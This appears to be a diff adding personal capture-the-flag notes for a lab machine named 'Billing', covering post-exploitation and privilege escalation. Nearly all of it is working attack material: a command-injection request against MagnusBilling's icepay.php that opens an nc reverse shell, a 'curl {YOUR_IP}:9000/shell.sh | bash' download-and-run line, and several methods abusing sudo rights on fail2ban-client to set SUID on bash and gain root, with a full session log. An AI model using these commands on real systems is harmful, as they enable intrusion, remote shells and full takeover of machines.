@@ -47,6 +47,166 @@ which file is -> user_shad.txt
 
 
 
+********************************************************************************
+post-exploitation using msfconsole
+------------------------
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+sudo -l
+
+
+
+
+Privilege Escalation or shell as root
+--------------------------------------
+method-1
+--------------
+if use fail2ban
+	- sudo /usr/bin/fail2ban-client --version
+	- systemctl status fail2ban
+	
+find / -perm -u=s -type f 2>/dev/null
+
+method-2
+---------
+sudo /usr/bin/fail2ban-client status
+sudo /usr/bin/fail2ban-client get sshd actions
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 666 /tmp/root.txt'"
+
+method-2.1
+----------
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'curl http://{YOUR_IP}:9000/shell.sh | bash'"
+sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
+now we check the listener - nc -nlvp 1235
+
+mehtod2.easiest
+---------------
+sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cp /bin/bash /tmp/ && chmod 777 /tmp/bash'"
+
+
+METHOD-2.2
+---------
+/etc/fail2ban
+sudo fail2ban-client -c /tmp/fail2ban/ -v restart
+rsync -av /etc/fail2ban/ /tmp/fail2ban/
+
+
+cat > /tmp/script <<EOF
+#!/bin/sh
+cp /bin/bash /tmp/bash
+chmod 755 /tmp/bash
+chmod u+s /tmp/bash
+EOF
+chmod +x /tmp/script
+
+
+cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
+[Definition]
+actionstart = /tmp/script
+EOF
+
+cat >> /tmp/fail2ban/jail.local <<EOF
+[my-custom-jail]
+enabled = true
+action = custom-start-command
+EOF
+
+cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
+[Definition]
+EOF
+
+sudo fail2ban-client -c /tmp/fail2ban/ -v restart
+
+
+another method
+---------------
+$ time curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php?democ=;sleep+2;'
+real    2.19s
+
+$ time curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'
+real    5.27s
+
+testing uing curl : $ curl -s 'http://10.10.160.86/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.64.79 443 >/tmp/f;'
+
+
+$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.8.64.79] from (UNKNOWN) [10.10.160.86] 41006
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+asterisk@Billing:/var/www/html/mbilling/lib/icepay$ export TERM=xterm
+asterisk@Billing:/var/www/html/mbilling/lib/icepay$ ^Z
+zsh: suspended  nc -lvnp 443
+
+$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 443
+
+asterisk@Billing:/var/www/html/mbilling/lib/icepay$ id
+uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
+asterisk@Billing:/var/www/html/mbilling/lib/icepay$ wc -c /home/magnus/user.txt
+38 /home/magnus/user.txt
+
+
+
+shell as root
+asterisk@Billing:/$ sudo -l
+Matching Defaults entries for asterisk on Billing:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for asterisk:
+    Defaults!/usr/bin/fail2ban-client !requiretty
+
+User asterisk may run the following commands on Billing:
+    (ALL) NOPASSWD: /usr/bin/fail2ban-client
+
+
+asterisk@Billing:/$ ps -aux | grep fail
+root         539  0.2  1.4 1167416 27992 ?       Ssl  13:10   0:08 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client status
+Status
+|- Number of jail:      8
+`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
+
+
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
+The jail asterisk-iptables has the following actions:
+iptables-allports-ASTERISK
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
+The jail asterisk-iptables has the following actions:
+iptables-allports-ASTERISK
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+chmod +s /bin/bash
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
+chmod +s /bin/bash
+
+
+
+asterisk@Billing:/$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+
+asterisk@Billing:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
+1
+
+asterisk@Billing:/$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+
+
+
+asterisk@Billing:/$ /bin/bash -p
+bash-5.1# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
+root@Billing:/# id
+uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
+root@Billing:/# wc -c /root/root.txt
+38 /root/root.txt
+
 
 
 
